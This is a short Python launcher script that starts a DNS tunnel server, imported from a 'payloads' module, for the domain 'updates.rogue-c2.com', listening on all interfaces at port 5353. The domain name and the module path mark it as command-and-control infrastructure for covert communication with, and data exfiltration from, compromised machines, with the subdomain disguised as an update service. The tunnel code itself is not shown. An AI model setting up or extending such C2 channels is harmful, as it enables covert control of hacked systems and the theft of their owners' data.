
import sys
sys.path.append('.')
from payloads.dnstunnel import DNSTunnel
import time

tunnel = DNSTunnel(
    domain='updates.rogue-c2.com',
    mode='server',
    listen_ip='0.0.0.0',
    listen_port=5353
)

print('[+] DNS tunnel server starting on port 5353')
print('[+] Domain: *.updates.rogue-c2.com')

try:
    tunnel.start_server()
except Exception as e:
    print(f'[!] DNS server error: {e}')
    import traceback
    traceback.print_exc()
